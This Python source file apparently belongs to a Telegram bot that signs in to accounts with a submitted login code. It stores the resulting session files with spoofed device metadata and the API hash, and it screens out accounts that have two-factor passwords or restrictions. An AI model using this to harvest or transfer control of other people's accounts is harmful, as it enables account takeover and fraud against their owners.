"""
Session validator for number verification
"""
import os
import json
import asyncio
import logging
from datetime import datetime
from typing import Dict, Optional
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError, AuthKeyUnregisteredError, UserDeactivatedError, UserDeactivatedBanError
from telethon.tl.functions.account import GetPasswordRequest
from telethon.tl.functions.users import GetUsersRequest

logger = logging.getLogger(__name__)

class SessionValidator:
    def __init__(self, api_id: int, api_hash: str, sessions_dir: str):
        self.api_id = api_id
        self.api_hash = api_hash
        self.sessions_dir = sessions_dir
        self.clients = {}
        self.cleanup_interval = 600  # 10 minutes
        self.last_cleanup = datetime.now()
    
    def _cleanup_expired_clients(self):
        """Clean up expired client sessions from memory"""
        try:
            current_time = datetime.now()
            expired_keys = []
            
            for key, client_data in self.clients.items():
                code_sent_at = client_data.get('code_sent_at')
                if code_sent_at:
                    time_diff = (current_time - code_sent_at).total_seconds()
                    # Clean up clients older than 20 minutes (generous buffer)
                    if time_diff > 1200:
                        expired_keys.append(key)
            
            # Remove expired clients
            for key in expired_keys:
                try:
                    client_data = self.clients[key]
                    if 'client' in client_data and client_data['client']:
                        asyncio.create_task(client_data['client'].disconnect())
                    del self.clients[key]
                    logger.info(f"Cleaned up expired client: {key}")
                except Exception as e:
                    logger.error(f"Error cleaning up client {key}: {e}")
            
            if expired_keys:
                logger.info(f"Cleaned up {len(expired_keys)} expired client sessions")
            
            self.last_cleanup = current_time
            
        except Exception as e:
            logger.error(f"Error during client cleanup: {e}")
    
    def _should_cleanup(self) -> bool:
        """Check if cleanup should be performed"""
        return (datetime.now() - self.last_cleanup).total_seconds() > self.cleanup_interval
    
    async def send_code(self, phone: str) -> bool:
        """Send verification code"""
        import uuid
        import time
        
        # Perform cleanup if needed
        if self._should_cleanup():
            self._cleanup_expired_clients()
        
        # Create organized session directories
        pending_dir = os.path.join(self.sessions_dir, "pending")
        os.makedirs(pending_dir, exist_ok=True)
        
        # Create unique session path to prevent race conditions
        timestamp = int(time.time() * 1000)
        unique_id = str(uuid.uuid4())[:8]
        session_path = os.path.join(pending_dir, f"temp_{phone}_{timestamp}_{unique_id}")
        
        client = TelegramClient(session_path, self.api_id, self.api_hash)
        await client.connect()
        
        try:
            result = await client.send_code_request(phone)
            
            # Create unique client key to prevent conflicts
            client_key = f"{phone}_{timestamp}_{unique_id}"
            self.clients[client_key] = {
                'client': client,
                'session_path': session_path,
                'code_hash': result,
                'code_sent_at': datetime.now(),
                'phone': phone,
                'original_phone_key': phone  # For backward compatibility
            }
            
            # Also store with phone as key for backward compatibility, but use latest
            self.clients[phone] = self.clients[client_key]
            
            logger.info(f"Code sent successfully to {phone} with unique session {client_key}")
            return True
        except Exception as e:
            logger.error(f"Error sending code to {phone}: {e}")
            await client.disconnect()
            # Clean up session file if it exists
            session_file = session_path + '.session'
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                except:
                    pass
            raise e
    
    async def validate_and_create_session(self, phone: str, code: str, user_id: int) -> Dict:
        """Validate code and create session"""
        if phone not in self.clients:
            logger.error(f"Phone {phone} not found in clients dictionary. Available phones: {list(self.clients.keys())}")
            return {'success': False, 'error_key': 'code_not_sent', 'error_message': 'Code was not sent or session expired'}
        
        # Check if code was sent recently (within 15 minutes)
        client_data = self.clients[phone]
        code_sent_at = client_data.get('code_sent_at')
        if code_sent_at:
            time_diff = (datetime.now() - code_sent_at).total_seconds()
            if time_diff > 900:  # 15 minutes
                logger.warning(f"Code for {phone} expired after {time_diff} seconds")
                await client_data['client'].disconnect()
                del self.clients[phone]
                return {'success': False, 'error_key': 'code_expired', 'error_message': 'Verification code expired'}
        
        client_data = self.clients[phone]
        client = client_data['client']
        
        try:
            # Sign in with code
            await client.sign_in(phone, code, phone_code_hash=client_data['code_hash'].phone_code_hash)
            
            # Check for 2FA
            has_2fa = False
            has_email = False
            
            try:
                password_info = await client(GetPasswordRequest())
                
                if password_info.has_password:
                    await client.disconnect()
                    return {'success': False, 'error_key': 'has_2fa'}
                
                # Check for recovery email
                if hasattr(password_info, 'has_recovery') and password_info.has_recovery:
                    has_email = True
                    logger.info(f"Account {phone} has recovery email")
                
            except SessionPasswordNeededError:
                await client.disconnect()
                return {'success': False, 'error_key': 'has_2fa'}
            
            # Get account info and check if account is frozen/restricted
            me = await client.get_me()
            
            # Check if account is frozen/restricted
            is_frozen = await self._check_account_frozen(client, me)
            if is_frozen:
                await client.disconnect()
                
                # Save frozen account session to rejected folder before cleanup
                await self._save_frozen_session_to_rejected(phone, user_id, me, client_data['session_path'])
                
                return {'success': False, 'error_key': 'account_frozen', 'account_info': {
                    'user_id': me.id,
                    'first_name': me.first_name or '',
                    'username': me.username or '',
                    'phone': phone
                }}
            
            # Create final session paths - keep the + prefix
            pending_dir = os.path.join(self.sessions_dir, "pending")
            final_session_path = os.path.join(pending_dir, f"{phone}.session")
            json_path = os.path.join(pending_dir, f"{phone}.json")
            
            # Disconnect and move files
            await client.disconnect()
            await asyncio.sleep(1)
            
            # Move session file
            temp_session = client_data['session_path'] + '.session'
            if os.path.exists(temp_session):
                # Remove final session if it already exists to avoid rename error
                if os.path.exists(final_session_path):
                    try:
                        os.remove(final_session_path)
                    except Exception as e:
                        logger.warning(f"Failed to remove existing session file: {e}")
                os.rename(temp_session, final_session_path)
            
            # Create JSON metadata
            session_data = {
                'phone': phone,
                'user_id': me.id,
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Samsung Galaxy S21',
                'system_version': 'Android 11',
                'app_version': '8.9.3',
                'has_2fa': has_2fa,
                'has_email': has_email,
                'created_by': user_id,
                'created_at': datetime.now().isoformat(),
                'status': 'pending'
            }
            
            with open(json_path, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            return {
                'success': True,
                'session_path': final_session_path,
                'json_path': json_path,
                'device_info': f"{session_data['device_model']} - {session_data['system_version']}",
                'telegram_user_id': me.id,
                'username': me.username or ''
            }
            
        except SessionPasswordNeededError:
            await client.disconnect()
            
            # Save 2FA account session to rejected folder before cleanup
            await self._save_2fa_session_to_rejected(phone, user_id, client_data['session_path'])
            
            return {'success': False, 'error_key': 'has_2fa'}
        except Exception as e:
            logger.error(f"Error validating session for {phone}: {e}")
            await client.disconnect()
            return {'success': False, 'error_key': 'validation_error', 'error_message': str(e)}
        finally:
            # Clean up client data and temp files
            if phone in self.clients:
                client_data = self.clients[phone]
                
                # Properly disconnect client
                if 'client' in client_data and client_data['client']:
                    try:
                        await client_data['client'].disconnect()
                    except Exception as e:
                        logger.warning(f"Error disconnecting client: {e}")
                
                # Clean up temp session file
                temp_session = client_data['session_path'] + '.session'
                # Only clean up temp session if it exists and validation failed
                if os.path.exists(temp_session):
                    try:
                        os.remove(temp_session)
                        logger.info(f"Cleaned up temp session file: {temp_session}")
                    except Exception as e:
                        logger.warning(f"Failed to clean up temp session file: {e}")
                
                # Remove all client entries for this phone
                keys_to_remove = []
                for key, data in self.clients.items():
                    if data.get('phone') == phone:
                        keys_to_remove.append(key)
                
                for key in keys_to_remove:
                    del self.clients[key]
                    logger.debug(f"Removed client entry: {key}")
                
                # Final cleanup - force cleanup if many clients
                if len(self.clients) > 50:
                    logger.warning(f"High client count ({len(self.clients)}), forcing cleanup")
                    self._cleanup_expired_clients()
    
    async def check_session_validity(self, session_path: str) -> bool:
        """Check if session is still valid"""
        if not os.path.exists(session_path):
            return False
        
        try:
            client = TelegramClient(session_path, self.api_id, self.api_hash)
            await client.connect()
            
            if await client.is_user_authorized():
                await client.disconnect()
                return True
            else:
                await client.disconnect()
                return False
        except:
            return False
    
    async def _check_account_frozen(self, client: TelegramClient, me) -> bool:
        """Check if the Telegram account has restrictions."""
        from sessions.session_utils import check_account_frozen
        return await check_account_frozen(client, me)
    
    async def _save_frozen_session_to_rejected(self, phone: str, user_id: int, me, temp_session_path: str):
        """Save frozen account session directly to rejected folder"""
        try:
            import shutil
            
            # Define rejected folder paths
            rejected_dir = os.path.join(self.sessions_dir, "rejected")
            os.makedirs(rejected_dir, exist_ok=True)
            
            rejected_session_path = os.path.join(rejected_dir, f"{phone}.session")
            rejected_json_path = os.path.join(rejected_dir, f"{phone}.json")
            
            # Move session file to rejected folder
            temp_session_file = temp_session_path + '.session'
            if os.path.exists(temp_session_file):
                # Remove existing rejected session if it exists
                if os.path.exists(rejected_session_path):
                    os.remove(rejected_session_path)
                shutil.move(temp_session_file, rejected_session_path)
                logger.info(f"Moved frozen session to rejected folder: {rejected_session_path}")
            else:
                logger.warning(f"Temp session file not found: {temp_session_file}")
            
            # Create JSON metadata for rejected session
            session_data = {
                'phone': phone,
                'user_id': me.id,
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Samsung Galaxy S21',
                'system_version': 'Android 11',
                'app_version': '8.9.3',
                'has_2fa': False,
                'has_email': False,
                'created_by': user_id,
                'created_at': datetime.now().isoformat(),
                'status': 'rejected',
                'rejection_reason': 'Account is frozen/restricted by Telegram',
                'rejected_at': datetime.now().isoformat(),
                'rejected_by': 'system'
            }
            
            with open(rejected_json_path, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            logger.info(f"Created JSON metadata for frozen session: {rejected_json_path}")
            
        except Exception as e:
            logger.error(f"Error saving frozen session to rejected folder: {e}")
    
    async def _save_2fa_session_to_rejected(self, phone: str, user_id: int, temp_session_path: str):
        """Save 2FA account session directly to rejected folder"""
        try:
            import shutil
            
            # Define rejected folder paths
            rejected_dir = os.path.join(self.sessions_dir, "rejected")
            os.makedirs(rejected_dir, exist_ok=True)
            
            rejected_session_path = os.path.join(rejected_dir, f"{phone}.session")
            rejected_json_path = os.path.join(rejected_dir, f"{phone}.json")
            
            # Move session file to rejected folder
            temp_session_file = temp_session_path + '.session'
            if os.path.exists(temp_session_file):
                # Remove existing rejected session if it exists
                if os.path.exists(rejected_session_path):
                    os.remove(rejected_session_path)
                shutil.move(temp_session_file, rejected_session_path)
                logger.info(f"Moved 2FA session to rejected folder: {rejected_session_path}")
            else:
                logger.warning(f"Temp session file not found for 2FA: {temp_session_file}")
            
            # Create JSON metadata for rejected session
            session_data = {
                'phone': phone,
                'user_id': user_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Samsung Galaxy S21',
                'system_version': 'Android 11',
                'app_version': '8.9.3',
                'has_2fa': True,
                'has_email': False,
                'created_by': user_id,
                'created_at': datetime.now().isoformat(),
                'status': 'rejected',
                'rejection_reason': 'Account has 2FA (Two-Factor Authentication) enabled',
                'rejected_at': datetime.now().isoformat(),
                'rejected_by': 'system'
            }
            
            with open(rejected_json_path, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            logger.info(f"Created JSON metadata for 2FA session: {rejected_json_path}")
            
        except Exception as e:
            logger.error(f"Error saving 2FA session to rejected folder: {e}")
    
    def _force_cleanup_temp_files(self):
        """Force cleanup of temp files that couldn't be deleted normally"""
        try:
            pending_dir = os.path.join(self.sessions_dir, "pending")
            if not os.path.exists(pending_dir):
                return
            
            import glob
            import time
            
            # Find all temp session files older than 5 minutes
            temp_pattern = os.path.join(pending_dir, "temp_*.session")
            temp_files = glob.glob(temp_pattern)
            
            current_time = time.time()
            for temp_file in temp_files:
                try:
                    file_age = current_time - os.path.getmtime(temp_file)
                    if file_age > 300:  # 5 minutes
                        os.remove(temp_file)
                        logger.info(f"Force cleaned old temp file: {temp_file}")
                except Exception as e:
                    logger.warning(f"Could not force clean {temp_file}: {e}")
                    
        except Exception as e:
            logger.error(f"Error during force cleanup: {e}")